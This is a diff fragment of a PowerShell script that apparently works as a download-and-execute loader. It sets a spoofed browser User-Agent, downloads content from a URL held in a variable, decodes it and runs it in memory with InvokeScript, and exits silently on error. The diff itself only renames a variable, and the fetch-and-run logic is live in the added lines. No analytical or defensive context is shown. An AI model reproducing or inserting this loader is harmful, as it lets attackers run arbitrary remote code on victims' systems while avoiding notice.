@@ -8,7 +8,8 @@ if ($v -eq 1) {
         $o.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
         
         $b = $o."DownloadData"($u)
-        $c = [System.Text.Encoding]::UTF8.GetString($b)
-        $ExecutionContext.InvokeCommand.InvokeScript($c)
+        $s = [System.Text.Encoding]::UTF8.GetString($b)
+        
+        $ExecutionContext.InvokeCommand.InvokeScript($s)
     } catch { exit }
 }
